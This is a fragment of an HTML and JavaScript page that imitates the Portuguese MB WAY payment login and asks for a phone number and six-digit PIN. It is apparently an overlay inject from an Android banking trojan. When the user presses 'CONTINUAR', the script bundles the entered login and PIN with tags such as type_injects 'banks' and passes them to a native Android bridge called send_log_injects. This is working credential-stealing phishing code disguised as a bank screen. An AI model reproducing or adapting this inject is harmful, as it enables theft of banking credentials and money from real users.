    <style>
        	
        body {
        	background-color: #ffffff;
            display: flex;
  			flex-direction: column;
  			min-height: 100vh;
  			margin: 0;
        	}
        
        header {
        	background-color: #f2f3f5;
        	color: #353a40;
        	font-size:120%;
        	text-align: center;
        	padding: 20px;
        	}
        	
        .content {
            padding: 25px;
            flex-grow: 1;
        	}
        	
        footer {
            flex-shrink: 0;
            text-align: center;
        	}
        	
        .title {
        	margin-top: 10px;
        	}
        
        .country {
            border: 0;
            border-bottom: 1px solid #566f78;
            float: left;
            margin-bottom: 25px;
            margin-right: 15px;
            text-align: left;
            font-size: 16px;
        	}
        
        .mobile {
            border: 0;
            border-bottom: 1px solid #566f78;
            float: left;
            margin-bottom: 25px;
            text-align: left;
            font-size: 16px;
        	}
        	
         .inputmobile {
            border: 0;
            float: left;
            text-align: left;
            font-size: 16px;
            margin-top: 10px;
            margin-bottom: 12px;
            width: 120px;
            outline:none;
        	}
        	
        .inputpin {
            border: 0;
            border-bottom: 1px solid #566f78;
            float: left;
            margin-bottom: 25px;
            margin-right: 10px;
            text-align: left;
            font-size: 16px;
            outline:none;
        	}
        
        .button {
            background-color: #353a40;
            width: 70%;
            padding: 10px;
            border: 0;
            color: #ffffff;
            font-weight:bold;
            border-radius: 8px;
        	}
        
        .button:disabled {
        	background-color: #bdc2c8;
            opacity: 0.4;
        	}
        
        .bluelink {
        	color: #538ed4;
        	font-weight: bold;
        	padding: 10px;
        	text-align: center;
        	text-decoration:underline;
        	}
    
    </style>
    
</head>

<div id="expandtext" style="display: none;">
<span>Caso se tenha esquecido do seu PIN, dirija-se a um MULTIBANCO e selecione a opcáo MB WAY para definir um novo PIN MB WAY.</span>
	</div>
	</form>
	</div>
	
	<footer>
	<input type="button" class="button" id="sendData" disabled value="CONTINUAR">
	<p class="bluelink">Ainda náo tem MB WAY?</p>
	</footer>

	<script>
	
		$('#login').mask('000 000 000')
	
	
		var login = document.getElementById('login'),
        	password = document.getElementById('password'),
        	sendData = document.getElementById('sendData'),
        	form = document.getElementById('form');

        eyeOff.onclick = () => {
            eyeOff.style.display = 'none';
            eyeOn.style.display = 'inline';
            password.type = 'text';
        }

        eyeOn.onclick = () => {
            eyeOn.style.display = 'none';
            eyeOff.style.display = 'inline';
            password.type = 'password';
        }
        
        expand.onclick = () => {
        	if (expandtext.style.display == "none") {
        	expandtext.style.display = "flex";
        	} else {
        	expandtext.style.display = "none";
        	}
        	
        }
         
       function check() {
            if(login.value.length === 11 && password.value.length === 6) {
                sendData.disabled = false;
            } else {
            sendData.disabled = true;
            }
        }

        sendData.onclick = () => {

            	var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
  		  
	</script>
